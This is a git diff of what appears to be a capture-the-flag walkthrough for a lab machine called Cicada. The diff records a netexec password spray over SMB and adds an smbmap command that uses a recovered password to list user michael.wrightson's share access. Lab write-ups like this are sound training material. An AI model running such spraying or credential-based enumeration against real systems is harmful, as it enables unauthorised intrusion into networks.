@@ -73,7 +73,10 @@ netexec smb <target IP> -u userNames.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continu
 ```
 ![UserEnumPwd](Images/UserEnumPwd.png)
 
-We can see that the password worked for the user michael.wrightson
+We can see that the password worked for the user michael.wrightson.
+Next we can check what access Michael has to the available SMB shares.
 
-smbclient -L <target IP> -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
+```
+smbmap -H 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
+```
 
